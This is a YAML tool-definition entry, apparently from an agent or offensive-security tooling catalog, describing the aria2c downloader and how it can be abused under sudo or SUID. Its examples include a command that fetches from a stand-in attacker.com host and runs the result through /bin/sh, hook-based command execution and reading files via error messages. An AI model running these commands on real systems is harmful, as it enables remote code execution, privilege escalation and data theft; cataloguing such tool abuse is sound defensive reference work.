---
id: network-download-aria2c
namespace: network:download:aria2c
name: aria2c
description: Lightweight multi-protocol download utility that can execute commands via hooks and read files.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - network.transfer.download
  - security.execution.command
  - security.privilege-escalation.shell
  - system.file.read
  - system.file.write
platforms:
  - linux
  - macos
  - windows
  - cross-platform
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - curl
  - wget
artifacts:
  - type: network.transfer.file
    description: Downloaded file
    trust_level: community
workflow_edges:
  produces:
    - downloaded-file
    - file-content
    - command-output
  consumes:
    - download-url
contract:
  inputs:
    - type: network.target.url
      description: URL to download from
  outputs:
    - type: system.file.path
      description: Downloaded file
  side_effects:
    - network_traffic
    - filesystem_write
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: medium
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: medium
allowed-tools:
  - aria2c
  - Bash
  - execFile
parameters:
  - name: o
    type: file
    required: false
    description: "Output file path"
    aliases:
      - -o
  - name: i
    type: file
    required: false
    description: "Input file with URLs"
    aliases:
      - -i
  - name: allow-overwrite
    type: string
    required: false
    description: "Allow overwrite of existing files"
    aliases:
      - --allow-overwrite
  - name: gid
    type: string
    required: false
    description: "Set GID for download"
    aliases:
      - --gid
  - name: on-download-error
    type: file
    required: false
    description: "Command to run on download error"
    aliases:
      - --on-download-error
  - name: on-download-complete
    type: file
    required: false
    description: "Command to run on download complete"
    aliases:
      - --on-download-complete
features:
  - network-intensive
  - process-manip
  - file-system
execution:
  template: "aria2c {o} {i} {allow-overwrite} {gid} {on-download-error} {on-download-complete}"
  sandbox: execFile
  timeout_seconds: 60
  shell: false
global_vars:
  target: url
examples:
  - description: Execute a command on download error via hook
    command: |-
      echo /path/to/command >/path/to/temp-file
      chmod +x /path/to/temp-file
      aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain
  - description: Execute a command on download completion via remote payload
    command: aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa
  - description: Download a file remotely
    command: aria2c -o /path/to/output-file http://attacker.com/path/to/input-file
  - description: Read file content leaked in error messages
    command: aria2c -i /path/to/input-file
references:
  - label: "aria2 documentation"
    url: "https://aria2.github.io/manual/en/html/"
techniques:
  - privilege-escalation
  - execution
  - exfiltration
  - collection
install:
    - method: apt
      package_name: "aria2"
      commands:
        - "apt-get install -y aria2"
---


# aria2c — Download Utility

aria2c is a lightweight multi-protocol download utility supporting HTTP/HTTPS, FTP, SFTP, BitTorrent, and Metalink. When used with sudo or SUID, it can execute arbitrary commands via download hooks and read files through error messages.
